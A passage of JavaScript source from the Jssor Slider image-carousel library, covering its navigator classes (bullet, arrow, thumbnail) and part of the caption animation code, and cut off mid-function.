            $Jssor$.$AddEvent(elmt, "mouseover", $Jssor$.$MouseOverOutFilter(MainContainerMouseEnterEventHandler, elmt));

            ShowNavigators();

            //Keyboard Navigation
            if (_Options.$ArrowKeyNavigation) {
                $Jssor$.$AddEvent(document, "keydown", function (e) {
                    if (e.keyCode == $JssorKeyCode$.$LEFT) {
                        //Arrow Left
                        PlayToOffset(-1);
                    }
                    else if (e.keyCode == $JssorKeyCode$.$RIGHT) {
                        //Arrow Right
                        PlayToOffset(1);
                    }
                });
            }

            var startPosition = _Options.$StartIndex;
            if (!(_Loop & 1)) {
                startPosition = Math.max(0, Math.min(startPosition, _SlideCount - _DisplayPieces));
            }
            _CarouselPlayer.$PlayCarousel(startPosition, startPosition, 0);
        }
    }
    //Jssor Slider

    //JssorSlider.$ASSEMBLY_BOTTOM_LEFT = ASSEMBLY_BOTTOM_LEFT;
    //JssorSlider.$ASSEMBLY_BOTTOM_RIGHT = ASSEMBLY_BOTTOM_RIGHT;
    //JssorSlider.$ASSEMBLY_TOP_LEFT = ASSEMBLY_TOP_LEFT;
    //JssorSlider.$ASSEMBLY_TOP_RIGHT = ASSEMBLY_TOP_RIGHT;
    //JssorSlider.$ASSEMBLY_LEFT_TOP = ASSEMBLY_LEFT_TOP;
    //JssorSlider.$ASSEMBLY_LEFT_BOTTOM = ASSEMBLY_LEFT_BOTTOM;
    //JssorSlider.$ASSEMBLY_RIGHT_TOP = ASSEMBLY_RIGHT_TOP;
    //JssorSlider.$ASSEMBLY_RIGHT_BOTTOM = ASSEMBLY_RIGHT_BOTTOM;

    JssorSlider.$EVT_CLICK = 21;
    JssorSlider.$EVT_DRAG_START = 22;
    JssorSlider.$EVT_DRAG_END = 23;
    JssorSlider.$EVT_SWIPE_START = 24;
    JssorSlider.$EVT_SWIPE_END = 25;

    JssorSlider.$EVT_LOAD_START = 26;
    JssorSlider.$EVT_LOAD_END = 27;
    JssorSlider.$EVT_FREEZE = 28;

    JssorSlider.$EVT_POSITION_CHANGE = 202;
    JssorSlider.$EVT_PARK = 203;

    JssorSlider.$EVT_SLIDESHOW_START = 206;
    JssorSlider.$EVT_SLIDESHOW_END = 207;

    JssorSlider.$EVT_PROGRESS_CHANGE = 208;
    JssorSlider.$EVT_STATE_CHANGE = 209;
    JssorSlider.$EVT_ROLLBACK_START = 210;
    JssorSlider.$EVT_ROLLBACK_END = 211;

    window.$JssorSlider$ = $JssorSlider$ = JssorSlider;

    //(function ($) {
    //    jQuery.fn.jssorSlider = function (options) {
    //        return this.each(function () {
    //            return $(this).data('jssorSlider') || $(this).data('jssorSlider', new JssorSlider(this, options));
    //        });
    //    };
    //})(jQuery);

    //window.jQuery && (jQuery.fn.jssorSlider = function (options) {
    //    return this.each(function () {
    //        return jQuery(this).data('jssorSlider') || jQuery(this).data('jssorSlider', new JssorSlider(this, options));
    //    });
    //});
};

//$JssorBulletNavigator$
var $JssorNavigatorEvents$ = {
    $NAVIGATIONREQUEST: 1,
    $INDEXCHANGE: 2,
    $RESET: 3
};

var $JssorBulletNavigator$ = window.$JssorBulletNavigator$ = function (elmt, options, containerWidth, containerHeight) {
    var self = this;
    $JssorObject$.call(self);

    elmt = $Jssor$.$GetElement(elmt);

    var _Count;
    var _Length;
    var _Width;
    var _Height;
    var _CurrentIndex;
    var _CurrentInnerIndex = 0;
    var _Options;
    var _Steps;
    var _Lanes;
    var _SpacingX;
    var _SpacingY;
    var _Orientation;
    var _ItemPrototype;
    var _PrototypeWidth;
    var _PrototypeHeight;

    var _ButtonElements = [];
    var _Buttons = [];

    function Highlight(index) {
        if (index != -1)
            _Buttons[index].$Activate(index == _CurrentInnerIndex);
    }

    function OnNavigationRequest(index) {
        self.$TriggerEvent($JssorNavigatorEvents$.$NAVIGATIONREQUEST, index * _Steps);
    }

    self.$Elmt = elmt;
    self.$GetCurrentIndex = function () {
        return _CurrentIndex;
    };

    self.$SetCurrentIndex = function (index) {
        if (index != _CurrentIndex) {
            var lastInnerIndex = _CurrentInnerIndex;
            var innerIndex = Math.floor(index / _Steps);
            _CurrentInnerIndex = innerIndex;
            _CurrentIndex = index;

            Highlight(lastInnerIndex);
            Highlight(innerIndex);

            //self.$TriggerEvent($JssorNavigatorEvents$.$INDEXCHANGE, index);
        }
    };

    self.$Show = function (hide) {
        $Jssor$.$ShowElement(elmt, hide);
    };

    var _Located;
    self.$Relocate = function (containerWidth, containerHeight) {
        if (!_Located || _Options.$Scale == false) {
            if (_Options.$AutoCenter & 1) {
                $Jssor$.$CssLeft(elmt, (containerWidth - _Width) / 2);
            }
            if (_Options.$AutoCenter & 2) {
                $Jssor$.$CssTop(elmt, (containerHeight - _Height) / 2);
            }

            _Located = true;
        }
    };

    var _Initialized;
    self.$Reset = function (length) {
        if (!_Initialized) {
            _Length = length;
            _Count = Math.ceil(length / _Steps);
            _CurrentInnerIndex = 0;

            var itemOffsetX = _PrototypeWidth + _SpacingX;
            var itemOffsetY = _PrototypeHeight + _SpacingY;

            var maxIndex = Math.ceil(_Count / _Lanes) - 1;

            _Width = _PrototypeWidth + itemOffsetX * (!_Orientation ? maxIndex : _Lanes - 1);
            _Height = _PrototypeHeight + itemOffsetY * (_Orientation ? maxIndex : _Lanes - 1);

            $Jssor$.$CssWidth(elmt, _Width);
            $Jssor$.$CssHeight(elmt, _Height);

            for (var buttonIndex = 0; buttonIndex < _Count; buttonIndex++) {

                var numberDiv = $Jssor$.$CreateSpan();
                $Jssor$.$InnerText(numberDiv, buttonIndex + 1);

                var div = $Jssor$.$BuildElement(_ItemPrototype, "numbertemplate", numberDiv, true);
                $Jssor$.$CssPosition(div, "absolute");

                var columnIndex = buttonIndex % (maxIndex + 1);
                $Jssor$.$CssLeft(div, !_Orientation ? itemOffsetX * columnIndex : buttonIndex % _Lanes * itemOffsetX);
                $Jssor$.$CssTop(div, _Orientation ? itemOffsetY * columnIndex : Math.floor(buttonIndex / (maxIndex + 1)) * itemOffsetY);

                $Jssor$.$AppendChild(elmt, div);
                _ButtonElements[buttonIndex] = div;

                if (_Options.$ActionMode & 1)
                    $Jssor$.$AddEvent(div, "click", $Jssor$.$CreateCallback(null, OnNavigationRequest, buttonIndex));

                if (_Options.$ActionMode & 2)
                    $Jssor$.$AddEvent(div, "mouseover", $Jssor$.$MouseOverOutFilter($Jssor$.$CreateCallback(null, OnNavigationRequest, buttonIndex), div));

                _Buttons[buttonIndex] = $Jssor$.$Buttonize(div);
            }

            //self.$TriggerEvent($JssorNavigatorEvents$.$RESET);
            _Initialized = true;
        }
    };

    //JssorBulletNavigator Constructor
    {
        self.$Options = _Options = $Jssor$.$Extend({
            $SpacingX: 0,
            $SpacingY: 0,
            $Orientation: 1,
            $ActionMode: 1
        }, options);

        //Sodo statement for development time intellisence only
        $JssorDebug$.$Execute(function () {
            _Options = $Jssor$.$Extend({
                $Steps: undefined,
                $Lanes: undefined
            }, _Options);
        });

        _ItemPrototype = $Jssor$.$FindChild(elmt, "prototype");

        $JssorDebug$.$Execute(function () {
            if (!_ItemPrototype)
                $JssorDebug$.$Fail("Navigator item prototype not defined.");

            if (isNaN($Jssor$.$CssWidth(_ItemPrototype))) {
                $JssorDebug$.$Fail("Width of 'navigator item prototype' not specified.");
            }

            if (isNaN($Jssor$.$CssHeight(_ItemPrototype))) {
                $JssorDebug$.$Fail("Height of 'navigator item prototype' not specified.");
            }
        });

        _PrototypeWidth = $Jssor$.$CssWidth(_ItemPrototype);
        _PrototypeHeight = $Jssor$.$CssHeight(_ItemPrototype);

        $Jssor$.$RemoveChild(elmt, _ItemPrototype);

        _Steps = _Options.$Steps || 1;
        _Lanes = _Options.$Lanes || 1;
        _SpacingX = _Options.$SpacingX;
        _SpacingY = _Options.$SpacingY;
        _Orientation = _Options.$Orientation - 1;
    }
};

var $JssorArrowNavigator$ = window.$JssorArrowNavigator$ = function (arrowLeft, arrowRight, options, containerWidth, containerHeight) {
    var self = this;
    $JssorObject$.call(self);

    $JssorDebug$.$Execute(function () {

        if (!arrowLeft)
            $JssorDebug$.$Fail("Option '$ArrowNavigatorOptions' spepcified, but UI 'arrowleft' not defined. Define 'arrowleft' to enable direct navigation, or remove option '$ArrowNavigatorOptions' to disable direct navigation.");

        if (!arrowRight)
            $JssorDebug$.$Fail("Option '$ArrowNavigatorOptions' spepcified, but UI 'arrowright' not defined. Define 'arrowright' to enable direct navigation, or remove option '$ArrowNavigatorOptions' to disable direct navigation.");

        if (isNaN($Jssor$.$CssWidth(arrowLeft))) {
            $JssorDebug$.$Fail("Width of 'arrow left' not specified.");
        }

        if (isNaN($Jssor$.$CssWidth(arrowRight))) {
            $JssorDebug$.$Fail("Width of 'arrow right' not specified.");
        }

        if (isNaN($Jssor$.$CssHeight(arrowLeft))) {
            $JssorDebug$.$Fail("Height of 'arrow left' not specified.");
        }

        if (isNaN($Jssor$.$CssHeight(arrowRight))) {
            $JssorDebug$.$Fail("Height of 'arrow right' not specified.");
        }
    });

    var _Length;
    var _CurrentIndex;
    var _Options;
    var _Steps;
    var _ArrowWidth = $Jssor$.$CssWidth(arrowLeft);
    var _ArrowHeight = $Jssor$.$CssHeight(arrowLeft);

    function OnNavigationRequest(steps) {
        self.$TriggerEvent($JssorNavigatorEvents$.$NAVIGATIONREQUEST, steps, true);
    }

    self.$GetCurrentIndex = function () {
        return _CurrentIndex;
    };

    self.$SetCurrentIndex = function (index, virtualIndex, temp) {
        if (temp) {
            _CurrentIndex = virtualIndex;
        }
        else {
            _CurrentIndex = index;
        }
        //self.$TriggerEvent($JssorNavigatorEvents$.$INDEXCHANGE, index);
    };

    self.$Show = function (hide) {
        $Jssor$.$ShowElement(arrowLeft, hide);
        $Jssor$.$ShowElement(arrowRight, hide);
    };

    var _Located;
    self.$Relocate = function (conainerWidth, containerHeight) {
        if (!_Located || _Options.$Scale == false) {

            if (_Options.$AutoCenter & 1) {
                $Jssor$.$CssLeft(arrowLeft, (containerWidth - _ArrowWidth) / 2);
                $Jssor$.$CssLeft(arrowRight, (containerWidth - _ArrowWidth) / 2);
            }

            if (_Options.$AutoCenter & 2) {
                $Jssor$.$CssTop(arrowLeft, (containerHeight - _ArrowHeight) / 2);
                $Jssor$.$CssTop(arrowRight, (containerHeight - _ArrowHeight) / 2);
            }

            _Located = true;
        }
    };

    var _Initialized;
    self.$Reset = function (length) {
        _Length = length;
        _CurrentIndex = 0;

        if (!_Initialized) {

            $Jssor$.$AddEvent(arrowLeft, "click", $Jssor$.$CreateCallback(null, OnNavigationRequest, -_Steps));
            $Jssor$.$AddEvent(arrowRight, "click", $Jssor$.$CreateCallback(null, OnNavigationRequest, _Steps));

            $Jssor$.$Buttonize(arrowLeft);
            $Jssor$.$Buttonize(arrowRight);

            _Initialized = true;
        }

        //self.$TriggerEvent($JssorNavigatorEvents$.$RESET);
    };

    //JssorArrowNavigator Constructor
    {
        self.$Options = _Options = $Jssor$.$Extend({
            $Steps: 1
        }, options);

        _Steps = _Options.$Steps;
    }
};

//$JssorThumbnailNavigator$
var $JssorThumbnailNavigator$ = window.$JssorThumbnailNavigator$ = function (elmt, options) {
    var _Self = this;
    var _Length;
    var _Count;
    var _CurrentIndex;
    var _Options;
    var _NavigationItems = [];

    var _Width;
    var _Height;
    var _Lanes;
    var _SpacingX;
    var _SpacingY;
    var _PrototypeWidth;
    var _PrototypeHeight;
    var _DisplayPieces;

    var _Slider;
    var _CurrentMouseOverIndex = -1;

    var _SlidesContainer;
    var _ThumbnailPrototype;

    $JssorObject$.call(_Self);
    elmt = $Jssor$.$GetElement(elmt);

    function NavigationItem(item, index) {
        var self = this;
        var _Wrapper;
        var _Button;
        var _Thumbnail;

        function Highlight(mouseStatus) {
            _Button.$Activate(_CurrentIndex == index);
        }

        function OnNavigationRequest(event) {
            if (!_Slider.$LastDragSucceded()) {
                var tail = _Lanes - index % _Lanes;
                var slideVirtualIndex = _Slider.$GetVirtualIndex((index + tail) / _Lanes - 1);
                var itemVirtualIndex = slideVirtualIndex * _Lanes + _Lanes - tail;
                _Self.$TriggerEvent($JssorNavigatorEvents$.$NAVIGATIONREQUEST, itemVirtualIndex);
            }

            //$JssorDebug$.$Log("navigation request");
        }

        $JssorDebug$.$Execute(function () {
            self.$Wrapper = undefined;
        });

        self.$Index = index;

        self.$Highlight = Highlight;

        //NavigationItem Constructor
        {
            _Thumbnail = item.$Thumb || item.$Image || $Jssor$.$CreateDiv();
            self.$Wrapper = _Wrapper = $Jssor$.$BuildElement(_ThumbnailPrototype, "thumbnailtemplate", _Thumbnail, true);

            _Button = $Jssor$.$Buttonize(_Wrapper);
            if (_Options.$ActionMode & 1)
                $Jssor$.$AddEvent(_Wrapper, "click", OnNavigationRequest);
            if (_Options.$ActionMode & 2)
                $Jssor$.$AddEvent(_Wrapper, "mouseover", $Jssor$.$MouseOverOutFilter(OnNavigationRequest, _Wrapper));
        }
    }

    _Self.$GetCurrentIndex = function () {
        return _CurrentIndex;
    };

    _Self.$SetCurrentIndex = function (index, virtualIndex, temp) {
        var oldIndex = _CurrentIndex;
        _CurrentIndex = index;
        if (oldIndex != -1)
            _NavigationItems[oldIndex].$Highlight();
        _NavigationItems[index].$Highlight();

        if (!temp) {
            _Slider.$PlayTo(_Slider.$GetVirtualIndex(Math.floor(virtualIndex / _Lanes)));
        }
    };

    _Self.$Show = function (hide) {
        $Jssor$.$ShowElement(elmt, hide);
    };

    _Self.$Relocate = $Jssor$.$EmptyFunction;

    var _Initialized;
    _Self.$Reset = function (length, items, loadingContainer) {
        if (!_Initialized) {
            _Length = length;
            _Count = Math.ceil(_Length / _Lanes);
            _CurrentIndex = -1;
            _DisplayPieces = Math.min(_DisplayPieces, items.length);

            var horizontal = _Options.$Orientation & 1;

            var slideWidth = _PrototypeWidth + (_PrototypeWidth + _SpacingX) * (_Lanes - 1) * (1 - horizontal);
            var slideHeight = _PrototypeHeight + (_PrototypeHeight + _SpacingY) * (_Lanes - 1) * horizontal;

            var slidesContainerWidth = slideWidth + (slideWidth + _SpacingX) * (_DisplayPieces - 1) * horizontal;
            var slidesContainerHeight = slideHeight + (slideHeight + _SpacingY) * (_DisplayPieces - 1) * (1 - horizontal);

            $Jssor$.$CssPosition(_SlidesContainer, "absolute");
            $Jssor$.$CssOverflow(_SlidesContainer, "hidden");
            if (_Options.$AutoCenter & 1) {
                $Jssor$.$CssLeft(_SlidesContainer, (_Width - slidesContainerWidth) / 2);
            }
            if (_Options.$AutoCenter & 2) {
                $Jssor$.$CssTop(_SlidesContainer, (_Height - slidesContainerHeight) / 2);
            }
            //$JssorDebug$.$Execute(function () {
            //    if (!_Options.$AutoCenter) {
            //        var slidesContainerTop = $Jssor$.$CssTop(_SlidesContainer);
            //        var slidesContainerLeft = $Jssor$.$CssLeft(_SlidesContainer);

            //        if (isNaN(slidesContainerTop)) {
            //            $JssorDebug$.$Fail("Position 'top' wrong specification of thumbnail navigator slides container (<div u=\"thumbnavigator\">...<div u=\"slides\">), \r\nwhen option $ThumbnailNavigatorOptions.$AutoCenter set to 0, it should be specified in pixel (like <div u=\"slides\" style=\"top: 0px;\">)");
            //        }

            //        if (isNaN(slidesContainerLeft)) {
            //            $JssorDebug$.$Fail("Position 'left' wrong specification of thumbnail navigator slides container (<div u=\"thumbnavigator\">...<div u=\"slides\">), \r\nwhen option $ThumbnailNavigatorOptions.$AutoCenter set to 0, it should be specified in pixel (like <div u=\"slides\" style=\"left: 0px;\">)");
            //        }
            //    }
            //});
            $Jssor$.$CssWidth(_SlidesContainer, slidesContainerWidth);
            $Jssor$.$CssHeight(_SlidesContainer, slidesContainerHeight);

            var slideItemElmts = [];
            $Jssor$.$Each(items, function (item, index) {
                var navigationItem = new NavigationItem(item, index);
                var navigationItemWrapper = navigationItem.$Wrapper;

                var columnIndex = Math.floor(index / _Lanes);
                var laneIndex = index % _Lanes;

                $Jssor$.$CssLeft(navigationItemWrapper, (_PrototypeWidth + _SpacingX) * laneIndex * (1 - horizontal));
                $Jssor$.$CssTop(navigationItemWrapper, (_PrototypeHeight + _SpacingY) * laneIndex * horizontal);

                if (!slideItemElmts[columnIndex]) {
                    slideItemElmts[columnIndex] = $Jssor$.$CreateDiv();
                    $Jssor$.$AppendChild(_SlidesContainer, slideItemElmts[columnIndex]);
                }

                $Jssor$.$AppendChild(slideItemElmts[columnIndex], navigationItemWrapper);

                _NavigationItems.push(navigationItem);
            });

            var thumbnailSliderOptions = $Jssor$.$Extend({
                $HWA: false,
                $AutoPlay: false,
                $NaviQuitDrag: false,
                $SlideWidth: slideWidth,
                $SlideHeight: slideHeight,
                $SlideSpacing: _SpacingX * horizontal + _SpacingY * (1 - horizontal),
                $MinDragOffsetToSlide: 12,
                $SlideDuration: 200,
                $PauseOnHover: 1,
                $PlayOrientation: _Options.$Orientation,
                $DragOrientation: _Options.$DisableDrag ? 0 : _Options.$Orientation
            }, _Options);

            _Slider = new $JssorSlider$(elmt, thumbnailSliderOptions);

            _Initialized = true;
        }

        //_Self.$TriggerEvent($JssorNavigatorEvents$.$RESET);
    };

    //JssorThumbnailNavigator Constructor
    {
        _Self.$Options = _Options = $Jssor$.$Extend({
            $SpacingX: 3,
            $SpacingY: 3,
            $DisplayPieces: 1,
            $Orientation: 1,
            $AutoCenter: 3,
            $ActionMode: 1
        }, options);

        //Sodo statement for development time intellisence only
        $JssorDebug$.$Execute(function () {
            _Options = $Jssor$.$Extend({
                $Lanes: undefined,
                $Width: undefined,
                $Height: undefined
            }, _Options);
        });

        _Width = $Jssor$.$CssWidth(elmt);
        _Height = $Jssor$.$CssHeight(elmt);

        $JssorDebug$.$Execute(function () {
            if (!_Width)
                $JssorDebug$.$Fail("width of 'thumbnavigator' container not specified.");
            if (!_Height)
                $JssorDebug$.$Fail("height of 'thumbnavigator' container not specified.");
        });

        _SlidesContainer = $Jssor$.$FindChild(elmt, "slides", true);
        _ThumbnailPrototype = $Jssor$.$FindChild(_SlidesContainer, "prototype");

        $JssorDebug$.$Execute(function () {
            if (!_ThumbnailPrototype)
                $JssorDebug$.$Fail("prototype of 'thumbnavigator' not defined.");
        });

        _PrototypeWidth = $Jssor$.$CssWidth(_ThumbnailPrototype);
        _PrototypeHeight = $Jssor$.$CssHeight(_ThumbnailPrototype);

        $Jssor$.$RemoveChild(_SlidesContainer, _ThumbnailPrototype);

        _Lanes = _Options.$Lanes || 1;
        _SpacingX = _Options.$SpacingX;
        _SpacingY = _Options.$SpacingY;
        _DisplayPieces = _Options.$DisplayPieces;
    }
};

//$JssorCaptionSliderBase$
function $JssorCaptionSliderBase$() {
    $JssorAnimator$.call(this, 0, 0);
    this.$Revert = $Jssor$.$EmptyFunction;
}

var $JssorCaptionSlider$ = window.$JssorCaptionSlider$ = function (container, captionSlideOptions, playIn) {
    $JssorDebug$.$Execute(function () {
        if (!captionSlideOptions.$CaptionTransitions) {
            $JssorDebug$.$Error("'$CaptionSliderOptions' option error, '$CaptionSliderOptions.$CaptionTransitions' not specified.");
        }
        //else if (!$Jssor$.$IsArray(captionSlideOptions.$CaptionTransitions)) {
        //    $JssorDebug$.$Error("'$CaptionSliderOptions' option error, '$CaptionSliderOptions.$CaptionTransitions' is not an array.");
        //}
    });

    var _Self = this;
    var _ImmediateOutCaptionHanger;
    var _PlayMode = playIn ? captionSlideOptions.$PlayInMode : captionSlideOptions.$PlayOutMode;

    var _CaptionTransitions = captionSlideOptions.$CaptionTransitions;
    var _CaptionTuningFetcher = { $Transition: "t", $Delay: "d", $Duration: "du", x: "x", y: "y", $Rotate: "r", $Zoom: "z", $Opacity: "f", $BeginTime: "b" };
    var _CaptionTuningTransfer = {
        $Default: function (value, tuningValue) {
            if (!isNaN(tuningValue.$Value))
                value = tuningValue.$Value;
            else
                value *= tuningValue.$Percent;

            return value;
        },
        $Opacity: function (value, tuningValue) {
            return this.$Default(value - 1, tuningValue);
        }
    };
    _CaptionTuningTransfer.$Zoom = _CaptionTuningTransfer.$Opacity;

    $JssorAnimator$.call(_Self, 0, 0);

    function GetCaptionItems(element, level) {

        var itemsToPlay = [];
        var lastTransitionName;
        var namedTransitions = [];
        var namedTransitionOrders = [];

        //$JssorDebug$.$Execute(function () {

        //    var debugInfoElement = $Jssor$.$GetElement("debugInfo");

        //    if (debugInfoElement && playIn) {

        //        var text = $Jssor.$InnerHtml(debugInfoElement) + "<br>";

        //        $Jssor$.$InnerHtml(debugInfoElement, text);
        //    }
        //});

        function FetchRawTransition(captionElmt, index) {
            var rawTransition = {};

            $Jssor$.$Each(_CaptionTuningFetcher, function (fetchAttribute, fetchProperty) {
                var attributeValue = $Jssor$.$AttributeEx(captionElmt, fetchAttribute + (index || ""));
                if (attributeValue) {
                    var propertyValue = {};

                    if (fetchAttribute == "t") {
                        //if (($Jssor$.$IsBrowserChrome() || $Jssor$.$IsBrowserSafari() || $Jssor$.$IsBrowserFireFox()) && attributeValue == "*") {
                        //    attributeValue = Math.floor(Math.random() * captionSlideOptions.$CaptionTransitions.length);
                        //    $Jssor$.$Attribute(captionElmt, fetchAttribute + (index || ""), attributeValue);
                        //}

                        propertyValue.$Value = attributeValue;
                    }
                    else if (attributeValue.indexOf("%") + 1)
                        propertyValue.$Percent = $Jssor$.$ParseFloat(attributeValue) / 100;
                    else
                        propertyValue.$Value = $Jssor$.$ParseFloat(attributeValue);

                    rawTransition[fetchProperty] = propertyValue;
                }
            });

            return rawTransition;
        }

        function GetRandomTransition() {
            return _CaptionTransitions[Math.floor(Math.random() * _CaptionTransitions.length)];
        }

        function EvaluateCaptionTransition(transitionName) {

            var transition;

            if (transitionName == "*") {
                transition = GetRandomTransition();
            }
            else if (transitionName) {

                //indexed transition allowed, just the same as named transition
                var tempTransition = _CaptionTransitions[$Jssor$.$ParseInt(transitionName)] || _CaptionTransitions[transitionName];

                if ($Jssor$.$IsArray(tempTransition)) {
                    if (transitionName != lastTransitionName) {
                        lastTransitionName = transitionName;
                        namedTransitionOrders[transitionName] = 0;

                        namedTransitions[transitionName] = tempTransition[Math.floor(Math.random() * tempTransition.length)];
                    }
                    else {
                        namedTransitionOrders[transitionName]++;
                    }

                    tempTransition = namedTransitions[transitionName];

                    if ($Jssor$.$IsArray(tempTransition)) {
                        tempTransition = tempTransition.length && tempTransition[namedTransitionOrders[transitionName] % tempTransition.length];

                        if ($Jssor$.$IsArray(tempTransition)) {
                            //got transition from array level 3, random for all captions
                            tempTransition = tempTransition[Math.floor(Math.random() * tempTransition.length)];
                        }
                        //else {
                        //    //got transition from array level 2, in sequence for all adjacent captions with same name specified
                        //    transition = tempTransition;
                        //}
                    }
                    //else {
                    //    //got transition from array level 1, random but same for all adjacent captions with same name specified
                    //    transition = tempTransition;
                    //}
                }
                //else {
                //    //got transition directly from a simple transition object
                //    transition = tempTransition;
                //}

                transition = tempTransition;

                if ($Jssor$.$IsString(transition))
                    transition = EvaluateCaptionTransition(transition);
            }

            return transition;
        }

        var captionElmts = $Jssor$.$Children(element);
        $Jssor$.$Each(captionElmts, function (captionElmt, i) {

            var transitionsWithTuning = [];
            transitionsWithTuning.$Elmt = captionElmt;
            var isCaption = $Jssor$.$AttributeEx(captionElmt, "u") == "caption";

            $Jssor$.$Each(playIn ? [0, 3] : [2], function (j, k) {

                if (isCaption) {
                    var transition;
                    var rawTransition;

                    if (j != 2 || !$Jssor$.$AttributeEx(captionElmt, "t3")) {
                        rawTransition = FetchRawTransition(captionElmt, j);

                        if (j == 2 && !rawTransition.$Transition) {
                            rawTransition.$Delay = rawTransition.$Delay || { $Value: 0 };
                            rawTransition = $Jssor$.$Extend(FetchRawTransition(captionElmt, 0), rawTransition);
                        }
                    }

                    if (rawTransition && rawTransition.$Transition) {

                        transition = EvaluateCaptionTransition(rawTransition.$Transition.$Value);

                        if (transition) {

                            //var transitionWithTuning = $Jssor$.$Extend({ $Delay: 0, $ScaleHorizontal: 1, $ScaleVertical: 1 }, transition);
                            var transitionWithTuning = $Jssor$.$Extend({ $Delay: 0 }, transition);

                            $Jssor$.$Each(rawTransition, function (rawPropertyValue, propertyName) {
                                var tuningPropertyValue = (_CaptionTuningTransfer[propertyName] || _CaptionTuningTransfer.$Default).apply(_CaptionTuningTransfer, [transitionWithTuning[propertyName], rawTransition[propertyName]]);
                                if (!isNaN(tuningPropertyValue))
                                    transitionWithTuning[propertyName] = tuningPropertyValue;
                            });

                            if (!k) {
                                if (rawTransition.$BeginTime)
                                    transitionWithTuning.$BeginTime = rawTransition.$BeginTime.$Value || 0;
                                else if ((_PlayMode) & 2)
                                    transitionWithTuning.$BeginTime = 0;
                            }
                        }
                    }

                    transitionsWithTuning.push(transitionWithTuning);
                }

                if ((level % 2) && !k) {
                    //transitionsWithTuning.$Children = GetCaptionItems(captionElmt, lastTransitionName, [].concat(namedTransitions), [].concat(namedTransitionOrders), level + 1);
                    transitionsWithTuning.$Children = GetCaptionItems(captionElmt, level + 1);
                }
            });

            itemsToPlay.push(transitionsWithTuning);
        });

        return itemsToPlay;
    }

    function CreateAnimator(item, transition, immediateOut) {

        var animatorOptions = {
            $Easing: transition.$Easing,
            $Round: transition.$Round,
            $During: transition.$During,
            $Reverse: playIn && !immediateOut,
            $Optimize: true
        };

        $JssorDebug$.$Execute(function () {
            animatorOptions.$CaptionAnimator = true;
        });

        var captionItem = item;
        var captionParent = $Jssor$.$ParentNode(item);

        var captionItemWidth = $Jssor$.$CssWidth(captionItem);
        var captionItemHeight = $Jssor$.$CssHeight(captionItem);
        var captionParentWidth = $Jssor$.$CssWidth(captionParent);
        var captionParentHeight = $Jssor$.$CssHeight(captionParent);

        var toStyles = {};
        var fromStyles = {};
        var scaleClip = transition.$ScaleClip || 1;

        //Opacity
        if (transition.$Opacity) {
            toStyles.$Opacity = 2 - transition.$Opacity;
        }

        animatorOptions.$OriginalWidth = captionItemWidth;
        animatorOptions.$OriginalHeight = captionItemHeight;

        //Transform
        if (transition.$Zoom || transition.$Rotate) {
            toStyles.$Zoom = transition.$Zoom ? transition.$Zoom - 1 : 1;

            if ($Jssor$.$IsBrowserIe9Earlier() || $Jssor$.$IsBrowserOpera())
                toStyles.$Zoom = Math.min(toStyles.$Zoom, 2);

            fromStyles.$Zoom = 1;

            var rotate = transition.$Rotate || 0;

            toStyles.$Rotate = rotate * 360;
            fromStyles.$Rotate = 0;
        }
            //Clip
        else if (transition.$Clip) {
            var fromStyleClip = { $Top: 0, $Right: captionItemWidth, $Bottom: captionItemHeight, $Left: 0 };
            var toStyleClip = $Jssor$.$Extend({}, fromStyleClip);

            var blockOffset = toStyleClip.$Offset = {};

            var topBenchmark = transition.$Clip & 4;
            var bottomBenchmark = transition.$Clip & 8;
            var leftBenchmark = transition.$Clip & 1;
            var rightBenchmark = transition.$Clip & 2;

            if (topBenchmark && bottomBenchmark) {
                blockOffset.$Top = captionItemHeight / 2 * scaleClip;
                blockOffset.$Bottom = -blockOffset.$Top;
            }
            else if (topBenchmark)
                blockOffset.$Bottom = -captionItemHeight * scaleClip;
            else if (bottomBenchmark)
                blockOffset.$Top = captionItemHeight * scaleClip;

            if (leftBenchmark && rightBenchmark) {
                blockOffset.$Left = captionItemWidth / 2 * scaleClip;
                blockOffset.$Right = -blockOffset.$Left;
            }
            else if (leftBenchmark)
                blockOffset.$Right = -captionItemWidth * scaleClip;
            else if (rightBenchmark)
                blockOffset.$Left = captionItemWidth * scaleClip;

            animatorOptions.$Move = transition.$Move;
            toStyles.$Clip = toStyleClip;
            fromStyles.$Clip = fromStyleClip;
        }

        //Fly
        {
            var toLeft = 0;
            var toTop = 0;

            if (transition.x)
                toLeft -= captionParentWidth * transition.x;

            if (transition.y)
                toTop -= captionParentHeight * transition.y;

            if (toLeft || toTop || animatorOptions.$Move) {
                toStyles.$Left = toLeft + $Jssor$.$CssLeft(captionItem);
                toStyles.$Top = toTop + $Jssor$.$CssTop(captionItem);
            }
        }

        //duration
        var duration = transition.$Duration;

        fromStyles = $Jssor$.$Extend(fromStyles, $Jssor$.$GetStyles(captionItem, toStyles));

        animatorOptions.$Setter = $Jssor$.$StyleSetterEx();

        return new $JssorAnimator$(transition.$Delay, duration, animatorOptions, captionItem, fromStyles, toStyles);
    }

    function CreateAnimators(streamLineLength, captionItems) {

        $Jssor$.$Each(captionItems, function (captionItem, i) {

            $JssorDebug$.$Execute(function () {
                if (captionItem.length) {
                    var top = $Jssor$.$CssTop(captionItem.$Elmt);
                    var left = $Jssor$.$CssLeft(captionItem.$Elmt);
                    var width = $Jssor$.$CssWidth(captionItem.$Elmt);
                    var height = $Jssor$.$CssHeight(captionItem.$Elmt);

                    var error = null;

                    if (isNaN(top))
                        error = "Style 'top' for caption not specified. Please always specify caption like 'position: absolute; top: ...px; left: ...px; width: ...px; height: ...px;'.";
                    else if (isNaN(left))
                        error = "Style 'left' not specified. Please always specify caption like 'position: absolute; top: ...px; left: ...px; width: ...px; height: ...px;'.";
                    else if (isNaN(width))
                        error = "Style 'width' not specified. Please always specify caption like 'position: absolute; top: ...px; left: ...px; width: ...px; height: ...px;'.";
                    else if (isNaN(height))
                        error = "Style 'height' not specified. Please always specify caption like 'position: absolute; top: ...px; left: ...px; width: ...px; height: ...px;'.";

                    if (error)
                        $JssorDebug$.$Error("Caption " + (i + 1) + " definition error, \r\n" + error + "\r\n" + captionItem.$Elmt.outerHTML);
                }
            });

            var animator;
            var captionElmt = captionItem.$Elmt;
            var transition = captionItem[0];
            var transition3 = captionItem[1];

            if (transition) {

                animator = CreateAnimator(captionElmt, transition);
                streamLineLength = animator.$Locate(transition.$BeginTime == undefined ? streamLineLength : transition.$BeginTime, 1);
            }

            streamLineLength = CreateAnimators(streamLineLength, captionItem.$Children);

            if (transition3) {
                var animator3 = CreateAnimator(captionElmt, transition3, 1);
                animator3.$Locate(streamLineLength, 1);
                _Self.$Combine(animator3);
